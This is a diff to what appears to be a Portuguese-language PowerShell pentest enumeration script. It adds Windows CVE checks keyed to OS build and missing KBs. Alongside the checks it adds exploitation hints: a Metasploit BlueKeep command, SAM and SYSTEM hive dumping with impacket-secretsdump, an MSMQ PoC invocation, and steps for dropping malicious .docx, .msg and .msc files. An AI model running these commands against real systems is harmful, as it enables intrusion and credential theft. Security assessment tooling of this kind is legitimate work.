@@ -1959,7 +1959,7 @@ function Invoke-ModernChecks {
 
 # ─── CVE CHECKS ──────────────────────────────────────────────────────────────
 function Invoke-CVEChecks {
-    W-Sec "CVE — Vulnerabilidades Conhecidas (2020-2026)"
+    W-Sec "CVE — Vulnerabilidades Conhecidas (2019-2026)"
 
     # Coleta build do OS e KBs instalados uma vez
     $osBuild = 0
@@ -1972,6 +1972,19 @@ function Invoke-CVEChecks {
 
     # Guard: se build nao detectado (0), pular checks dependentes de build — evita falso positivo
     $buildKnown = ($osBuild -gt 0)
+
+    # ── 2019 ─────────────────────────────────────────────────────────────────
+    W-Sub "2019 — BlueKeep (RDP RCE pre-auth)"
+    # BlueKeep: somente Windows 7 (7601) e Server 2008 (6001-6003) — Win8+ NAO afetado
+    if ($buildKnown -and $osBuild -in @(6001,6002,6003,7601)) {
+        $rdpOn = try { (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -EA Stop).fDenyTSConnections -eq 0 } catch { $true }
+        if ($rdpOn -and -not $hkSet.Contains("KB4499175") -and -not $hkSet.Contains("KB4499167") -and -not $hkSet.Contains("KB4499149")) {
+            W-Crit "CVE-2019-0708 (BlueKeep) — Build $osBuild + RDP ativo + sem patch — RCE pre-auth unauthenticated via RDP"
+            W-Hint "msfconsole -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS <target>; run'"
+        } else { W-Ok "CVE-2019-0708 (BlueKeep): RDP desabilitado ou patch aplicado" }
+    } elseif ($buildKnown) {
+        W-Ok "CVE-2019-0708 (BlueKeep): build $osBuild nao afetado (somente Win7 / Server 2008)"
+    }
 
     # ── 2020 ─────────────────────────────────────────────────────────────────
     W-Sub "2020 — SMBGhost / Zerologon"
@@ -1989,7 +2002,7 @@ function Invoke-CVEChecks {
     }
 
     # ── 2021 ─────────────────────────────────────────────────────────────────
-    W-Sub "2021 — PrintNightmare / InstallerFileTakeOver / noPac"
+    W-Sub "2021 — PrintNightmare / InstallerFileTakeOver / noPac / HiveNightmare"
     try {
         $spooler = Get-Service -Name Spooler -ErrorAction Stop
         if ($spooler.Status -eq "Running") {
@@ -2021,8 +2034,20 @@ function Invoke-CVEChecks {
         } catch {}
     }
 
+    # CVE-2021-36934 (HiveNightmare/SeriousSAM): builds 17763-19043 (Win10 1809 ate 21H1)
+    if ($buildKnown -and $osBuild -ge 17763 -and $osBuild -le 19043) {
+        if (-not $hkSet.Contains("KB5004569") -and -not $hkSet.Contains("KB5004570")) {
+            W-Crit "CVE-2021-36934 (HiveNightmare/SeriousSAM) — Build $osBuild sem KB5004569 — SAM legivel por usuario comum"
+            W-Hint "reg save HKLM\SAM C:\Temp\sam.hive && reg save HKLM\SYSTEM C:\Temp\sys.hive && impacket-secretsdump -sam sam.hive -system sys.hive LOCAL"
+        }
+    }
+    # CVE-2021-40449 (Win32k EoP — explorado pelo APT MysterySnail): builds < 22000
+    if ($buildKnown -and $osBuild -lt 22000 -and -not $hkSet.Contains("KB5006674") -and -not $hkSet.Contains("KB5006670")) {
+        W-High "CVE-2021-40449 (Win32k CallNtUserImeStrokeInfo EoP) — KB5006674 ausente — explorado pelo APT MysterySnail (out/2021)"
+    }
+
     # ── 2022 ─────────────────────────────────────────────────────────────────
-    W-Sub "2022 — Certifried / CLFS EoP"
+    W-Sub "2022 — Certifried / CLFS / Follina / Win32k"
     if ($buildKnown -and $inDomain -and -not $hkSet.Contains("KB5014754")) {
         W-High "CVE-2022-26923 (Certifried) — KB5014754 ausente — LPE via ADCS spoofing de dNSHostName"
         W-Hint "Certify.exe find /vulnerable  ||  certipy account update -user <m$> -dns <DC_FQDN>"
@@ -2030,9 +2055,18 @@ function Invoke-CVEChecks {
     if ($buildKnown -and -not $hkSet.Contains("KB5017308") -and -not $hkSet.Contains("KB5017315")) {
         W-High "CVE-2022-37969 (CLFS EoP) — KB5017308 ausente — LPE via Common Log File System Driver"
     }
+    # CVE-2022-21882 (Win32k EoP — bypass de CVE-2021-1732): jan/2022
+    if ($buildKnown -and -not $hkSet.Contains("KB5009563") -and -not $hkSet.Contains("KB5009566")) {
+        W-High "CVE-2022-21882 (Win32k EoP) — KB5009563 ausente — bypass de mitigacao CVE-2021-1732 via NtUserSetWindowFeedbackSetting"
+    }
+    # CVE-2022-30190 (Follina/MSDT RCE): jun/2022 — requer msdt.exe presente
+    if ($buildKnown -and (Test-Path "C:\Windows\System32\msdt.exe") -and -not $hkSet.Contains("KB5014699") -and -not $hkSet.Contains("KB5014697")) {
+        W-Crit "CVE-2022-30190 (Follina/MSDT RCE) — msdt.exe presente + KB5014699 ausente — RCE via ms-msdt:// em documentos Office"
+        W-Hint "Dropar .docx com link ms-msdt:// — executa cmd sem abrir msdt visualmente (explorado in-the-wild)"
+    }
 
     # ── 2023 ─────────────────────────────────────────────────────────────────
-    W-Sub "2023 — Outlook NTLM / CLFS / Streaming Proxy"
+    W-Sub "2023 — Outlook NTLM / CLFS / Streaming / MSMQ"
     $outlookFound = @(
         "$env:ProgramFiles\Microsoft Office\root\Office16\OUTLOOK.EXE",
         "${env:ProgramFiles(x86)}\Microsoft Office\root\Office16\OUTLOOK.EXE"
@@ -2047,9 +2081,15 @@ function Invoke-CVEChecks {
     if ($buildKnown -and -not $hkSet.Contains("KB5031361") -and -not $hkSet.Contains("KB5031354")) {
         W-High "CVE-2023-36802 (Streaming Service Proxy EoP) — KB5031361 ausente — 0-day explorado in-the-wild"
     }
+    # CVE-2023-21554 (MSMQ QueueJumper RCE): abr/2023 — requer MSMQ rodando na porta 1801
+    $msmqSvc = try { Get-Service -Name MSMQ -ErrorAction Stop } catch { $null }
+    if ($msmqSvc -and $msmqSvc.Status -eq "Running" -and $buildKnown -and -not $hkSet.Contains("KB5025221") -and -not $hkSet.Contains("KB5025224")) {
+        W-Crit "CVE-2023-21554 (MSMQ QueueJumper RCE) — MSMQ rodando + KB5025221 ausente — RCE unauthenticated via porta 1801"
+        W-Hint "nc -zv <target> 1801  &&  python3 CVE-2023-21554.py <target>"
+    }
 
     # ── 2024 ─────────────────────────────────────────────────────────────────
-    W-Sub "2024 — appid.sys / WER / CSC / Kernel / AFD"
+    W-Sub "2024 — appid.sys / WER / CSC / Kernel / AFD / MMC"
     if ($buildKnown -and -not $hkSet.Contains("KB5034441") -and -not $hkSet.Contains("KB5034440")) {
         W-High "CVE-2024-21338 (appid.sys WDAC bypass LPE) — KB5034441 ausente"
     }
@@ -2066,9 +2106,24 @@ function Invoke-CVEChecks {
         W-Crit "CVE-2024-38193 (AFD.sys EoP) — KB5041571 ausente — explorado pelo APT Lazarus (agosto 2024)"
         W-Hint "PoC publico disponivel — LPE de usuario comum para SYSTEM via AFD driver"
     }
+    # CVE-2024-21413 (Outlook Moniker Link RCE): fev/2024 — requer Outlook instalado
+    if ($outlookFound -and -not $hkSet.Contains("KB5002543") -and -not $hkSet.Contains("KB5002537")) {
+        W-Crit "CVE-2024-21413 (Outlook Moniker Link RCE) — Outlook + KB5002543 ausente — RCE via .msg com hyperlink moniker (bypass Protected View)"
+        W-Hint "Enviar .msg com link file:///<attacker>/<payload> — Preview pane e suficiente para explorar"
+    }
+    # CVE-2024-43572 (MMC MSC EvilTwin — 0-day explorado in-the-wild): out/2024
+    if ($buildKnown -and -not $hkSet.Contains("KB5044280") -and -not $hkSet.Contains("KB5044273")) {
+        W-High "CVE-2024-43572 (MMC MSC EvilTwin) — KB5044280 ausente — LPE via arquivo .msc malicioso explorado in-the-wild (out/2024)"
+        W-Hint "Dropar arquivo .msc forjado — constranger snap-in legítimo via CLSID substituido para carregar DLL arbitraria"
+    }
+    # CVE-2024-49039 (Windows Task Scheduler EoP — APT RomCom): nov/2024
+    if ($buildKnown -and -not $hkSet.Contains("KB5046617") -and -not $hkSet.Contains("KB5046613")) {
+        W-High "CVE-2024-49039 (Task Scheduler EoP) — KB5046617 ausente — escalada de AppContainer para Medium Integrity (RomCom, out/2024)"
+        W-Hint "Explorado em conjunto com CVE-2024-49040 — LPE de baixa integridade para escopo sistema"
+    }
 
     # ── 2025 ─────────────────────────────────────────────────────────────────
-    W-Sub "2025 — AFD EoP / NTLM hash leak / CLFS ransomware"
+    W-Sub "2025 — AFD EoP / NTLM / CLFS / Hyper-V / MMC"
     if ($buildKnown -and -not $hkSet.Contains("KB5050009") -and -not $hkSet.Contains("KB5050021")) {
         W-Crit "CVE-2025-21418 (AFD.sys EoP) — KB5050009 ausente — explorado in-the-wild (jan/2025)"
     }
@@ -2078,6 +2133,17 @@ function Invoke-CVEChecks {
     }
     if ($buildKnown -and -not $hkSet.Contains("KB5055523") -and -not $hkSet.Contains("KB5055519")) {
         W-Crit "CVE-2025-29824 (CLFS EoP) — KB5055523 ausente — vetor de ransomware RansomEXX / Storm-2460 (abr/2025)"
+    }
+    # CVE-2025-21333 (Hyper-V NT Kernel Integration VSP EoP — 0-day jan/2025)
+    $hvRunning = try { (Get-Service -Name vmms -ErrorAction Stop).Status -eq "Running" } catch { $false }
+    if ($hvRunning -and $buildKnown -and -not $hkSet.Contains("KB5049981") -and -not $hkSet.Contains("KB5049993")) {
+        W-Crit "CVE-2025-21333 (Hyper-V NT Kernel VSP EoP) — Hyper-V ativo + KB5049981 ausente — LPE explorado in-the-wild (jan/2025)"
+        W-Hint "Requer Hyper-V habilitado — escalada via NT Kernel Integration VSP sem privilegios adicionais"
+    }
+    # CVE-2025-26633 (MMC bypass 0-day — operacao Storm-2460 / Water Gamayun): mar/2025
+    if ($buildKnown -and -not $hkSet.Contains("KB5053598") -and -not $hkSet.Contains("KB5053606")) {
+        W-High "CVE-2025-26633 (MMC bypass 0-day) — KB5053598 ausente — UAC bypass via MSC malicioso explorado pelo TA569 / Water Gamayun (mar/2025)"
+        W-Hint "Dropar arquivo .msc malicioso — escalada silenciosa via MMC sem prompt de UAC"
     }
 
     W-Sub "Resumo de patches"
